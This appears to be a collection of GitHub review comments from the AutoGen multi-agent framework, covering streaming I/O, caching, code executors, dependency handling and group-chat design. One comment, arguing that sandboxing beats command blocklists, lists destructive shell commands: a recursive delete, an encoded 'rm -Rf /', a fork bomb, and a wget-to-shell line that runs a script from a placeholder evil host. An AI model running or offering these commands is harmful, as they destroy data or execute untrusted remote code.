Feel free to proceed with the current tasks, and we can consider my suggestions at a later stage. It would be really helpful if we could include a comprehensive example to demonstrate the use of the 'overwrite' feature. Could you contribute such an example?

Should we use the default values for production?
To solve, we can a) add this file to the repo or b) use the default values if the file is missing.
Fixed here: https://github.com/microsoft/autogen/pull/1480 (only show a warning)

Please also see: https://github.com/microsoft/autogen/issues/1465#issuecomment-1917968452

body:
> This is a great addition to the utils we have. My main question is do we want to use the same stream for all I/Os?
> 
> The other things is the use of global stream object setting is something I am not very used to. How does it compare to setting the stream objects explicity in the methods that trigger I/Os?

The global stream is not global, it is specific to your thread or async call stack as it uses [ContexVar](https://docs.python.org/3/library/contextvars.html) for the implementation: https://github.com/microsoft/autogen/blob/00ef5b370d7b0bcd83fc348bfb860c47e775f112/autogen/io/base.py#L55

In a typical server deployment, you get a new default stream tied to each websocket because each will be created in a new thread or async call which gets created for each new request. This is the easiest way to implement a server handling multiple requests.

If you need different streams for a single request, you can override this behaviour as you get an `IOStream` object in `on_connect` function you need to override, see e.g.

https://github.com/microsoft/autogen/blob/00ef5b370d7b0bcd83fc348bfb860c47e775f112/test/io/test_websockets.py#L89-L149

An alternative is propagating `iostream` parameter through all classes and I implemented that initially, but it was a lot more complex to use and override.

@SsspongeBob This piece of code creates a temporary directory so you always get a fresh response:
```python
    # we will use a temporary directory as the cache path root to ensure fresh completion each time
    with TemporaryDirectory() as cache_path_root:
        with Cache.disk(cache_path_root=cache_path_root) as cache:
            print(
                f" - on_connect(): Initiating chat with agent {agent} using message '{initial_msg}'",
                flush=True,
            )
            user_proxy.initiate_chat(  # noqa: F704
                agent,
                message=initial_msg,
                cache=cache,
            )
```
You can safely replace it with this:
```python
    user_proxy.initiate_chat(  # noqa: F704
        agent,
        message=initial_msg,
    )
```

> @ekzhu @jackgerrits could you check if this is in the doc roadmap?

@davorrunje thanks a lot for adding the streaming feature. We followed the notebook https://github.com/microsoft/autogen/blob/main/notebook/agentchat_websockets.ipynb to setup a fastapi server and deploy on aws using fargate. 

we are able to use the endpoint such as ws://x.x.x.x:8000/autogen locally when testing. 
once we push the code to vercel, and use HTTPS to access ws://x.x.x.x:8000/autogen, we get the following error:

we don't know how to setup WSS - any pointers on this? Thanks a lot.

body: Bundling the requirements with the function is a super good idea. However, if these functions weren't executed as "tools" but were shipped into the code execution environment then this mode of dependency installation would not work right? If the `execute_function` call was able to inspect if dependencies were needed and satisfy them explicitly then I feel like it would be more flexible? Because then the same could be done when this was used like a skill in another code execution environment
author: jackgerrits

body:
The @ requires decorator is super interesting. 

I note that we are in the same situation for many contrib agents that are now added as optional dependencies (RAG, Teachability, WebSurfer, etc.) I wonder if we should consolidate on mechanisms here?
author: afourney

body:
> Bundling the requirements with the function is a super good idea. However, if these functions weren't executed as "tools" but were shipped into the code execution environment then this mode of dependency installation would not work right? If the `execute_function` call was able to inspect if dependencies were needed and satisfy them explicitly then I feel like it would be more flexible? Because then the same could be done when this was used like a skill in another code execution environment

If you remove requires, the agent will install the package from package missing error. I have some ideas to improve this. Will report back.

I have a few remaining open questions about a few of the configuration parameters specific to autogen.

- `cache_seed` - The seed to be used to for disk based cache. Disable caching by setting this to `None`.
  - Is this still recommended to be used? It seems to be the only way to disable the default disk cache right?
- `cache` Is this meant to be used? How does this relate to the cache to be passed into `initiate_chats`?
- `allow_format_str_template` TODO
- `context` - This seems to be related to both `filter_func` and something to do with creation as well.
- `filter_func`, function which can be used to filter the completions returned by the model. Is this often used? Is it recommended to be used?
author: jackgerrits

body:
Left few comments. The right nav is looking good. The content is looking great too. Thank you! Ping for more feedback.


### Minor, general comment on writing

I think there is an opportunity to simplify the language. For example by using less passive voice. Consider the first para:

`In AutoGen, LLM’s are a key component required for agents to understand and react. Each agent’s access to and configuration of LLM’s is defined by the llm_config argument in its constructor. The simplest possible LLM configuration that is configured to use gpt-4 from OpenAI would be:`

Here is a simpler, more concise version:

`In AutoGen, agents use LLM as key components to understand and react. To configure an agent's to access LLMs, you can specify an llm_config argument in its constructor.  For example, the following snippet shows a configuration that uses gpt-4:`

Anyway, your writeup is great and this is a very minor comment. But now that we are improving the documentation, I thought I'd mention it. Its totally up to you, both versions get the message across.
author: gagb

body:
> * context

- cache_seed ... I believe this is still very relevant to determine if OpenAIWrapper uses a local cache or not. AFAIK best description of the behavior here is in the migration guide [here](https://github.com/microsoft/autogen/blob/d675489352be6343d4dfe64eac83760ab6259082/website/docs/Migration-Guide.md). However, the one unintuitive thing we have to mention here is that to disable local caching, we have to set cach_seed to None, else to an int value.

- cache ... I am not sure how this is used in intiate_chats
- context and filter_func, allow_format_str_template
 .. I rarely see this used (its probably an artifact from FLAML days where complex rules for llm selection and response validation were relevant). Either way, I'd say we remove these from base notebooks and add to some advanced topics section. (and link out to them). 

Huge +1 on supporting redirects!! Would save us alot of pain down the road.

body:
Sorry to be contrarian, but I worry this will give people a false sense of security.  

There are far too many regular patterns to block: E.g.,  
**WARNING: Don't actually try any of these!**

find  / -type f -delete
\`base64 --decode <<< "cm0gLVJmIC8="\`
perl -e 'fork while fork;'
or even just 
wget http://my_evil_script.com -O - | sh

Any protection we provide I think should be (1) via sanboxing, and (2) access control

Really, Docker is the best bet.
author: afourney

Yeah thats fair, this is just a starting point really - i know there could be an infinite number of commands that could blow up in someones face. But unless we have it as a hard requirement that someone has to use docker then i think that something like this (at least for the most common commands) is necessary.

I can approve this once the `raise` is modified to a warning. 

As others have noted, the real risk here is that it will conflict with people using the OpenAI client to connect to local or proxied models that may not have keys, or may use other key formats. A warning at least doesn't break this functionality (but I could see people complaining about the seeing it printed to console each time, and perhaps being confused).

I am wondering what prompted this PR? The only time I ever messed up the format was when I accidentally included a space (in this case, in an environment variable). 

A workable alternative might be to let the error happen, catch the exception, and only then check the formatting of the key so as to provide guidance on how to fix it if indeed misformatted.

@sonichi let me know what you think of this approach. One downside of this approach is it doesn't account for conflicting names. 

I have two solutions in mind:
1. Just simply return all the agents in a single list.
2. Store the agents in a list for each key  (`Dict[str, List[Agent]]`)
3. Store the agents in a nested dictionary, where the key can be the group chat manager's name

I'm leaning towards 1, it's simpler to implement, and conflicting names can't happen

I recommend moving the public methods into `GroupChat`. We don't recommend adding public methods in Agents because it hinders composability.

body:
Hi @ekzhu! My specific use case requires me to access the history between specific agents in nested teams. This is my current implementation:
-- team_factory.py
```python
def team(name: str) -> GroupChatManager:
    member1 = autogen.AssistantAgent(name=f"member1_{name}", ...)
    member2 = autogen.AssistantAgent(name=f"member2_{name}", ...)
    gc = autogen.GroupChat(agents=[member_1, member_2], ...)   
    
    return autogen.GroupChatManager(groupchat=gc, ...)

def some_team() -> GroupChatManager:
    engineering = team("engineering")
    hr = team("hr")
    
    gc = autogen.GroupChat(agents=[engineering, hr], ...)    
    return autogen.GroupChatManager(groupchat=gc, ...)
```

-- some_chatbot.py
```python
import team_factory

class SomeChatBot:
    def __init__(...):
         self._user = autogen.UserProxyAgen(...)
         self._some_team = team_factory.some_team()

        self._gc = autogen.GroupChat(...)
        self._manager = autogen.GroupChatManager(name="some_chatbot", groupchat=self._gc, ...)
        ...

    ...

    def _last_message(self) -> str:
        engineering = self._gc.agent_by_name("engineering")
        member1 = engineering._groupchat.agent_by_name("member1_engineering")
        member2 = engineering._groupchat.agent_by_name("member2_engineering")
        messages = member1.chat_messages.get(member2)
        ...
```
I had to access `_groupchat`, which is a private variable. I can redefine `team_factory.some_team() -> Tuple[GroupChat, GroupChatManager]`, but I think this doesn't look good, especially for nested teams. This problem can be rectified if I define each team and agent inside `__init__` in `SomeChatBot`, but I also think that doesn't look good and will clutter `SomeChatBot` (I could be wrong here).

Here's an example of how I ideally want to define `_last_message()`:

```python
def __init__(...):
    ...
    self._gc = autogen.GroupChat(...)
    self._manager = autogen.GroupChatManager(groupchat=self._gc, ...)
    ...

def _last_message(self) -> str:
    all_agents = self._gc.all_agents()
    member1 = all_agents["member1_engineering"]
    member2 = all_agents["member2_engineering"]
    
    messages = member2.chat_messages[member1]
    ...
```

I reworked the implementation slightly to account for @sonichi 's concerns about composability, which I agree with. This implementation should also work for deeply nested teams. Let me know what you think.

body:
> wondering if this needs to be passed into `cost` or if we can just pass all the args into the client constructor (as I believe is already done?) and re-use in different methods, that way we don't have to change the API every time we want to use a new config value

I'd love to figure this out. I think the issue I was working around is that the main wrapper client takes the config list, which may create many OAI or Azure clients, and we don't know which is used until we make the call. The cost method I had initially targeted for modification is a member of the wrapper client class. 

I'm not sure I fully understand the solution to this you are proposing, but I would be happy to get rid of the new parameter if possible.
author: afourney

body:
> > wondering if this needs to be passed into `cost` or if we can just pass all the args into the client constructor (as I believe is already done?) and re-use in different methods, that way we don't have to change the API every time we want to use a new config value
> 
> I'd love to figure this out. I think the issue I was working around is that the main wrapper client takes the config list, which may create many OAI or Azure clients, and we don't know which is used until we make the call. The cost method I had initially targeted for modification is a member of the wrapper client class.
> 
> I'm not sure I fully understand the solution to this you are proposing, but I would be happy to get rid of the new parameter if possible.

If we pass any extra kwargs that we need to the client constructors so for example `OpenAIClient`, then when `OpenAIClient`'s `cost` or `create` or other function is called it will have access to things like token cost, window size, etc
author: olgavrou

body:
Should we force or at least warn user to pass in token_cost if they are using azure?

From my previous experience azure always return 'gpt-4' in response['model'], this will very likely cause a wrong calculation of cost.
See #1270

body:
> > Do we duplicate notebooks in notebooks/ and Tutorials/ ?
> 
> Perhaps. I am not sure at this point. The goal is for the tutorial notebooks to be rendered as webpages. So it should be inside the “website” directory? Also, I think it won't be duplicate because the tutorial should have a coherent flow.

So I agree with these tutorials being added under website/

body:
I think instead of making these changes, you can take a look at the new cache module. 

You can clear the cache (or use a new one) after each generate reply. 

```python
from autogen.cache import Cache

with Cache.disk(cache_seed=1) as cache:
  agent.client_cache = cache
  agent.generate_reply(…)
  cache.clear() # or create a new one next time. 
```

If you use the same cache_seed each time it will reuse the same cached responses from before.

Actually if you use the same seed it will use the same cache instance. So the cache is not ephemeral. If you want to resample a specific response, just use different cache_seed, and pick one you want to continue the conversation. Cache is based on input messages.

This PR expands the `websurfer` extras requirements to include `selenium`.  I've also updated the workflow for `python-package.yml` to include the webdrivers for Edge, Firefox, and Chrome.  

All `pre-commit` tests in the dev docker instance pass, with one exception due to `no-commit-to-branch`.  I realize after the fact that committing to a separate branch would have been preferred and was able to able to commit using `SKIP=no-commit-to-branch git commit ...`.

Finally, regarding the `build` workflow, there are two pending issues:
1. It is still unclear how to inform the system that it should install the `websurfer` extra requirements for this PR
2. We're getting numerous `PytestUnknownMarkWarning: Unknown pytest.mark.asyncio` errors, however that markdown is used throughout and I wonder if it's an issue regarding the installed version of pytest.  As a side note in reporting, in the dev docker I had to upgrade pydantic to 2.5.3 when it couldn't find `field_validator` in a file unrelated to this PR

*EDIT:* In the process of building a notebook to demonstrate the elements in this PR and will commit.  This has illustrated the need for a few fixes including missing dependencies such as `arxiv` and `requests`.  Will update as soon as possible.

body: Thank you for the PR! In my opinion, it would be good to include some code examples in the notebook to demonstrate the advantages of the ContentAgent. From what I understand, the ContentAgent is a method for aggregating web information onto disk. However, I’m not sure whether the original assistant and userproxy agents could achieve the same goal through a meticulously designed prompt.
author: skzhang1

body:
> I’m not sure whether the original assistant and userproxy agents could achieve the same goal through a meticulously designed prompt.

Yes, I think you are correct that it could conceptually be handled strictly using existing agents and prompts.  I did it this way for two reasons.  The first being that this agent works as part of a larger pipeline that will require the archived content, and the second reason is from an energy conservation perspective.  Hopefully with recent developments it won't be a concern, but for now we ask if it's responsible to take the tractor (LLM inference) to pickup more cat food or just ride our bike (a scripted series of functions to archive the components).   That said, an LLM when done right could potentially handle the corner cases.  

The WebSurfer upgrades are a byproduct from the requirements of the WebArchivalAgent (thanks @skzhang1), which is a dependency of my next PR.  I _could_ technically remove the Content / WebArchivalAgent components from this PR.  I'm open to all ideas, especially what is best for Autogen as a whole.

The mitigation is also for us to set escape_html_in_docstring to false.

body: @PyroGenesis before proceeding, I want to understand the reason you don't want the docker Python library to be installed. Currently, the docker Python library is installed as a required dependency of `pyautogen`.
author: ekzhu

body:
I see. I didn't realize docker was a required dependency because something went wrong with the dependency resolver:

```
(project-py3.10) > poetry show pyautogen
 version      : 0.2.14
 description  : Enabling Next-Gen LLM Applications via Multi-Agent Conversation Framework

dependencies
 - chromadb *
 - diskcache *
 - flaml *
 - ipython *
 - openai >=1.3
 - pydantic >=1.10,<3
 - pypdf *
 - python-dotenv *
 - sentence_transformers *
 - termcolor *
 - tiktoken *
```

Anyway, creating a new project did resolve the docker dependency correctly, so this is not an issue anymore.
author: PyroGenesis

body: Thanks for the PR! The termination string makes sense to me for many non-openai LLMs. Can others comment on the changes made to speaker selection?
author: ekzhu

body:
> Thanks for the PR! The termination string makes sense to me for many non-openai LLMs. Can others comment on the changes made to speaker selection?

Thanks for the PR. I'm not sure about the hard-coded examples in autogen/agentchat/groupchat.py. @ekzhu, I suspect it might be better to instead:
(1) Try to run the existing autogen tests with alt-models and see where are the gaps, are they as per reported in this PR?
(2) Change the hard-coded examples to dynamic code in this PR.
(3) Ensure that the test passes with both alt-models and openai to prevent breaking openai whilst 'fixing' alt-models.
author: joshkyh

body:
Thanks for your suggestions @joshkyh, I'll jump in and say I'm happy to try running the tests with the alt-models to identify gaps, if someone can point me in the right direction on how to run them.

If the tests cover end-to-end scenario workflows (e.g. like the debating workflow I used for testing) that would highlight the gaps.
author: marklysze

body:
> Thanks for your suggestions @joshkyh, I'll jump in and say I'm happy to try running the tests with the alt-models to identify gaps, if someone can point me in the right direction on how to run them.


No worries, the tests can be found here
https://github.com/microsoft/autogen/tree/main/test

Though I think the most relevant ones should be in
https://github.com/microsoft/autogen/blob/main/test/agentchat/test_groupchat.py

https://github.com/microsoft/autogen/blob/main/.github/workflows/openai.yml 
and https://github.com/microsoft/autogen/blob/main/.github/workflows/contrib-openai.yml
specify the tests that require a openai endpoint, which in your case, would be swapped to a local LLM endpoint.

I'm not sure whether the maintainers would be keen to include local LLMs in the test workflows, would need to ask @ekzhu - I don't know who is the lead for `alt-models` related issues.

We should not be updating a user's execution policy. We can certainly inspect it and provide a detailed warning/error in the case where it will cause autogen to fail. The guidance should be to update powershell's execution policy and try again.

> 
> Also, I am pretty sure setting the execution policy requires an admin powershell, which we are absolutely not going to require.

It has -Scope CurrentUser argument, and we can give a restricted authority as well.
- AllSigned : All the scripts should be signed from a reliable source.
- RemoteSigned : If a script was downloaded from internet, it should be signed from a reliable source.

If we use AllSigned, agents can install reliable programs, but it can't execute what it wrote.
In the case of RemoteSigned, Agents can execute what they wrote as well.

Currently, the authority I set is RemoteSigned.

   For the better performance and security concern, we'd better set the policy instead of users.
1. If users encounter the issue and have no programming background, they will easily end up with Unrestricted. Therefore, it would be safer for users as well that we guide them into a proper setting.
2. Most of normal users are only familiar with Window. We'd better loosen the security for the better experience, when Window environment is already limited than Linux.

body: Thanks for the PR. I think this makes sense in the direction of refining AssistantAgent for the feature it supports currently. E.g., have a separate module to produce a prompt for different usage cases, platforms, etc. and have a mechanism to check the compatibility of prompt combinations among collaborative agents.
author: ekzhu

body:
> Thanks for the PR. I think this makes sense in the direction of refining AssistantAgent for the feature it supports currently. Though I have a brainstorming question: do you think there is a way to separate prompt tuning from the implementation? E.g., have a separate module to produce a prompt for different usage cases, platforms, etc. and have a mechanism to check the compatibility of prompt combinations among collaborative agents.

That makes sense yeah, for jupyter command execution the agent will have to be given a different prompt. I can make a separate folder with python files that have prompts for different agents and their specific use cases well organized. That way, for the jupyter executor all we'll have to do is create a new python file for that and add its prompt there. Instead of filling actual wordy prompts inside the implementation files we can then just call the modules and pass their respective variables as prompts right? This would help make things a lot easier and more organized for future developers as well.

I'd like to make a separate PR for that whole system tho rather than do that in this PR

body: I think the context manager approach is a great way to emphasis the docker resource being used. Shall we also use this syntax for the Docker Command Line Executor? The docker container can start when we enter the context and stopped when exiting the context. This way we avoid the "many image" problem people are complaining about that every time code executed an image is created. Furthermore, the same container can be shared across multiple agents in the same context, with different configuration of code executors. This also allows the container to be used by custom executors that support different languages.

body: I'd like to ask if there's any chance that code_execution_config could be completely deprecated?
author: IANTHEREAL

body:
Yes, that's the intention. Once the new executors are fully ready the old way of code execution would be deprecated. That will include the `code_execution_config` parameter.

Please let me know if you see any issues with that.
author: jackgerrits

body: Your change is good. If the newly added parameters do not coexist with `code_execution_config` in the future, that will be acceptable to me. Otherwise, the code could become overly complicated for developers.
author: IANTHEREAL

body: Looks very good to me. We need to reduce the number of configs for sure, this is a step in the right direction.
author: davorrunje

body: This is a good direction but I wonder whether it's the right timing. The new executors are introduced fairly new and there are many uncertainties about what the right settings should be exactly. I don't want to make this breaking change until we are sure these are the parameters to stay for a long time.
author: sonichi

body:
Using the new executors is already a change from the old way of code execution. So this is a question of how does a user use the new executor? The proposal is to use this opportunity to move new usage to this added parameter. It's only a breaking change for the last_n_messages option which I think is rarely used anyway?

If a user wanted to use executors they need to change their code no matter what (`code_execution_config={"executor":foo}` vs `code_executor=foo`, so this is just pushing us towards how we want it to work going forward

There is some added complexity that may come in future around using an executor for tool/function calls that @ekzhu,  @gagb and I were discussing yesterday but we're not ready to tackle that
author: jackgerrits

body:
Some contexts:
1. The usage of the new executors are not documented anywhere
2. This PR does not break existing usages, legacy or the `code_execution_config={"executor": executor}` style, I believe.
3. The new tutorial PR (#1702) still documents the legacy executor (docker and no docker).

> There is some added complexity that may come in future around using an executor for tool/function calls that @ekzhu, @gagb and I were discussing yesterday but we're not ready to tackle that. 

This is important bit, I think. The proposed `executor=executor` interface can still subject to change in the future. 

My feeling is that until we have figured out the design for function executor and general code executor, we keep the legacy executor as the default. The current `code_execution_config` has flaws but it lets us to keep the `ConversableAgent` interface stable.

Meanwhile we can document the new executors with notebooks, and pointers to them from the tutorial, advanced topics, etc.
author: ekzhu

body: We are going to come back to this once we work out how code executors and function/tool calling works together.
author: jackgerrits

body: Closing as we've moved forward with the "executor" field, can revisit later as part of larger changes if it makes sense

body: I think we need to be a bit more careful in changing the default behavior of code block extraction. Currently we only extract well-formed multi-line code blocks surrounded with three backticks "``". This is instruction is not hard for LLMs like GPT-4 to follow but could be an issue for open source LMs. I suggest we provide options in the code executors to turn this on, rather than changing the default behavior.

body:
@ekzhu I didn't tested code extraction for open source models. Hovewer, at some point I come to the conclusion, that it's better to... not use code extraction at all. Instead, I defined few tools as "insert code after line x", "replace code in lines", "create new file with code". All the file operations defined in python level inside the tools. Such function calling approach (at least at my application, where I'm creating web app) provided much better results - while with code extractor there was often situation when LLM removed half of the existing file ocasionally, with function calling were not so big mistakes. Also, function calling approach is safier, LLM can do only predefined list of things, so not requires docker to protect OS. So my advice based on practical experience - use function calling instead of code extraction when possible.

Althrough I understand there are different applications of Autogen and sometimes code extractor is needed, so it's good @PranitModak improving that feature. To test it with open source LLM, I recommend to use server feature in LM Studio.

body:
More context: We are still thinking about a proper approach to solve the compatibility contract that binds the code executor and code writer agents together. Before we have a good design, it was pre-mature to use system message instruction update. Thus, the proposal to remove it. Note: this feature has not been documented anywhere or recommended to use since released. Since many have reviewed it, need to get feedback on whether removing it is going to cause massive downstream rewrites. 

Alternatively, we can keep the feature there, but insert explicit warning on possible removal/changes.
author: ekzhu

body: @rickyloynd-microsoft  @IANTHEREAL since you were in the discussion earlier regarding the user capability, what's your comment on this? Jack and mine rational is that we are not sure if capability is the right abstraction to perform this system message update, so we want to avoid over-engineer this. The current capability only performs a system message update, which is brittle.
author: ekzhu

body:
> @rickyloynd-microsoft @IANTHEREAL since you were in the discussion earlier regarding the user capability, what's your comment on this? Jack and mine rational is that we are not sure if capability is the right abstraction to perform this system message update, so we want to avoid over-engineer this. The current capability only performs a system message update, which is brittle.

Yes, I agree that introducing a `UserCapability` mechanism (similar to the `AgentCapability` mechanism) would be overkill for simply updating a system message. Maybe there would be a stronger case for such a mechanism in the future, but I'm a fan of waiting until a feature is actually needed before doing much work to implement it.
author: rickyloynd-microsoft

body:

The current capability only performs a system message update, which is brittle.

I have no objections to first removing it. Moreover, I believe conducting more tests on placing the code executor guide in various structured prompts is essential. Such experiments would yield valuable insights for optimizing our approach.

The system prompt is covered in the docs for both -

- https://microsoft.github.io/autogen/docs/topics/code-execution/jupyter-code-executor#assigning-to-an-agent

These include an example system prompt that seems to be working quite well.

body:
Awesome!

Responding to a couple of your questions:
- I'm using TextAnalyzerAgent, so more llm calls, more token usage.
  - Nice to see TextAnalyzerAgent being used more.
- If an image was generated, we treat it as a final reply. Should it be the final reply? Or should we pass it along the reply chain?
  - I think all of the existing reply functions do the same, and I think it's very appropriate to treat a generated image as the final reply.

Looking forward to @BeibinLi's feedback.
author: rickyloynd-microsoft

body:
@WaelKarkoub Fantastic PR! Thanks so much for your work.

@rickyloynd-microsoft One thing I want to ask you is: should Dalle be a "skill" or "capability"? From the implementation perspective, I really like the current "capability" style. However, it may occur additional cost (aka, for text_analyzer) to process every message. The "skill", on the other hand, even though cheaper, would be less accurate (especially for small language models).

body: Quick question: Should we use `UserMessageTextContentPart` or `str` for text messages in the future? I've noticed that the message annotation from some functions is a union of `UserMessageTextContentPart` and `str`. Should we stick to one, or (be flexible) and support both?
author: BeibinLi

body:
> Quick question: Should we use `UserMessageTextContentPart` or `str` for text messages in the future? I've noticed that the message annotation from some functions is a union of `UserMessageTextContentPart` and `str`. Should we stick to one, or (be flexible) and support both?

This annotation was added for all of the functions that can handle both kinds. Both are valid and it depends on your use case. In reality most usages will just be `str` as `UserMessageTextContentPart` is for messages that include images.

@WaelKarkoub The cache test fails due to the working directory is not wiped between each run of agent conversations.

This: https://github.com/microsoft/autogen/blob/main/test/agentchat/test_cache_agent.py#L110
and this: https://github.com/microsoft/autogen/blob/main/test/agentchat/test_cache_agent.py#L154
